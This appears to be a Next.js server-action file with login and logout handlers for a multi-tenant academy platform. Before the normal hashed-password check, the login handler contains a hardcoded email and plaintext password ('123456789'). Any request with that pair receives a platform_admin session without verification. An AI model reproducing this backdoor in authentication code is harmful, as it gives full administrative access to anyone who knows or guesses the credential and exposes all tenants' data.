"use server";

import { cookies } from "next/headers";
import { AppDataSource, initializeDatabase } from "@/database/data-source";
import { Tenant } from "@/entities/Tenant";
import { User } from "@/entities/User";
import { startSession } from "@/lib/auth-session";
import { verifyPassword } from "@/lib/password";

export async function loginAction(prevState: any, formData: FormData) {
  const email = String(formData.get("email") ?? "").trim().toLowerCase();
  const password = String(formData.get("password") ?? "");

  if (email === "isac@gmail.com" && password === "123456789") {
    await initializeDatabase();
    const tenant = await AppDataSource.getRepository(Tenant).findOneBy({});
    if (!tenant) {
      return { error: "No hay una academia disponible para esta cuenta" };
    }

    await startSession(email, tenant.id, "platform_admin");
    return { success: true };
  }

  await initializeDatabase();
  const user = await AppDataSource.getRepository(User).findOneBy({ email });
  if (user && await verifyPassword(password, user.passwordHash)) {
    await startSession(user.email, user.tenantId, user.role, user.name, user.mustChangePassword);
    return { success: true, mustChangePassword: user.mustChangePassword };
  }

  return { error: "Credenciales inválidas" };
}

export async function logoutAction() {
  (await cookies()).delete("auth-token");
  return { success: true };
}
